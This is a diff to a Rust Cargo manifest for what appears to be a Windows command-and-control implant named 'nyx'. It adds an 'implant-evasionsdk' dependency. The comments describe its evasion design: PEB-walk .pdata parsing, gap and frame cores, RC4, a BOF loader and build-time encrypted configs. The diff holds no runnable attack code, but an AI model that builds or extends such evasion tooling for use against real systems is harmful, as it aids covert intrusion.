@@ -29,6 +29,11 @@ nyx-evasion = { path = "../evasion" }
 # COFF/BOF loader core (no_std-compatible): parse + relocate a CS-compatible
 # BOF object file. The implant's bof.rs maps sections W^X and runs them.
 nyx-coff = { path = "../coff" }
+# Userland evasion kit seams (no_std): pure-Rust gap/frame/rc4 algorithm cores
+# + trait seams. The implant feeds live .pdata bytes (read via the PEB walk in
+# resolve.rs) into gap::enumerate_gaps; the math lives ONLY here so the PIC
+# implant never re-implements it. See docs/WINDOWS_DEV.md §4 (P2.1a-i).
+nyx-implant-evasionsdk = { path = "../implant-evasionsdk", default-features = false }
 # Per-build encrypted config. no_std feature → only `decrypt` is pulled in
 # (chacha20poly1305 + alloc; no rand/getrandom). build.rs encrypts the config
 # on the host (std) and bakes key/nonce/ciphertext into OUT_DIR/config_blob.rs;
